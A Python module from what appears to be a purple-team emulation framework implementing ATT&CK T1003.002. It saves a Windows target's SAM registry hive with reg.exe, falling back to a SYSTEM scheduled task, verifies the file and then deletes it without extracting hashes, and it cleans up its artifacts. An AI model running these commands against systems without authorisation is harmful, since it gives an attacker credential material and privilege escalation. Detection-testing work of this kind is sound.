from __future__ import annotations

import logging
from typing import Any
from uuid import uuid4

from purplestrike.models.techniques import EmulationMode, ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import (
    TargetConnection,
    command_error,
    get_connection,
    is_transport_failure,
)
from purplestrike.techniques.scripts import delete_temp_files

logger = logging.getLogger(__name__)
_artifacts: dict[str, str] = {}


def _command_output(result: Any, limit: int) -> str:
    text = "\n".join(part for part in (result.stdout, result.stderr) if part)
    return text[:limit]


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        method = (parameters.get("method") or "registry").strip().lower()
        access_result = await conn.run_ps(
            "reg.exe query HKLM\\SAM 2>&1; reg.exe query HKLM\\SECURITY 2>&1"
        )
        access_output = _command_output(access_result, 1024)
        sam_accessible = access_result.success and "ERROR" not in access_output.upper()
        output_parts = [
            f"SAM registry access check: {'Accessible' if sam_accessible else 'Access denied'}"
        ]
        if access_output:
            output_parts.append(access_output)
        if is_transport_failure(access_result):
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                output="\n".join(output_parts)[:4096],
                error=command_error(access_result)[:1024],
                execution_status=ExecutionStatus.FAILURE,
            )

        if method == "registry":
            prefix = "purplestrike_sam_" + uuid4().hex[:10]
            _artifacts[target] = prefix
            sim_result = await conn.run_ps(
                "$ErrorActionPreference = 'Stop'; "
                f"$n = '{prefix}'; "
                f"$h = Join-Path $env:TEMP '{prefix}.hive'; "
                f"$o = Join-Path $env:TEMP '{prefix}.txt'; "
                "[IO.File]::Delete($h); [IO.File]::Delete($o); "
                "& reg.exe save HKLM\\SAM $h /y *> $o; "
                "if ($LASTEXITCODE -ne 0 -or !(Test-Path -LiteralPath $h)) { "
                "$args = '/d /s /c \"reg.exe save HKLM\\SAM "
                '""\' + $h + \'"" /y > ""\' + $o + \'"" 2>&1"\'; '
                "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument $args; "
                "Register-ScheduledTask -TaskName $n -Action $a -User 'SYSTEM' "
                "-RunLevel Highest -Force | Out-Null; "
                "try { Start-ScheduledTask -TaskName $n; "
                "for ($i=0; $i -lt 20 -and !(Test-Path -LiteralPath $h); $i++) "
                "{ Start-Sleep -Milliseconds 250 } } finally { "
                "Unregister-ScheduledTask -TaskName $n -Confirm:$false "
                "-ErrorAction SilentlyContinue } }; "
                "if (!(Test-Path -LiteralPath $h)) { "
                "$detail = Get-Content -LiteralPath $o -ErrorAction SilentlyContinue; "
                "throw ('SAM hive save failed: ' + ($detail -join '; ')) }; "
                "$length = (Get-Item -LiteralPath $h).Length; "
                "if ($length -le 0) { throw 'SAM hive was empty' }; "
                "'SAM hive saved (' + $length + ' bytes) and removed'; "
                "[IO.File]::Delete($h); [IO.File]::Delete($o)"
            )
            output_parts.append(f"Registry method:\n{_command_output(sim_result, 2048)}")
        elif method == "shadow_copy":
            sim_result = await conn.run_ps(
                "vssadmin.exe list shadows 2>&1; "
                "vssadmin.exe list volumes 2>&1 | Select-Object -First 5"
            )
            output_parts.append(
                f"Shadow copy method simulation:\n{_command_output(sim_result, 2048)}"
            )
        else:
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                error=f"Unsupported SAM dump method: {method}",
                output="\n".join(output_parts)[:4096],
                execution_status=ExecutionStatus.FAILURE,
            )
        if not sim_result.success:
            return TechniqueResult(
                technique_id="T1003.002",
                success=False,
                output="\n".join(output_parts)[:4096],
                error=command_error(sim_result)[:1024],
                execution_status=ExecutionStatus.FAILURE,
            )

        return TechniqueResult(
            technique_id="T1003.002",
            success=True,
            output="\n".join(output_parts)[:4096],
            execution_status=ExecutionStatus.SUCCESS,
            emulation_mode=(
                EmulationMode.PROCEDURE if method == "registry" else EmulationMode.PREREQUISITE
            ),
            evidence=(
                ["A non-empty SAM hive was saved and deleted without hash extraction."]
                if method == "registry"
                else ["Existing volume shadow copies were enumerated only."]
            ),
        )
    except Exception as e:
        logger.error(f"T1003.002 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1003.002",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    conn: TargetConnection | None = None
    try:
        prefix = _artifacts.get(target)
        if prefix is None:
            return
        conn = await get_connection(target)
        result = await conn.run_ps(
            f"Unregister-ScheduledTask -TaskName '{prefix}' -Confirm:$false "
            "-ErrorAction SilentlyContinue; "
            + delete_temp_files(f"{prefix}.hive", f"{prefix}.txt", f"{prefix}.cmd")
        )
        if not result.success:
            raise RuntimeError(command_error(result))
        _artifacts.pop(target, None)
    except Exception as e:
        logger.warning(f"T1003.002 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
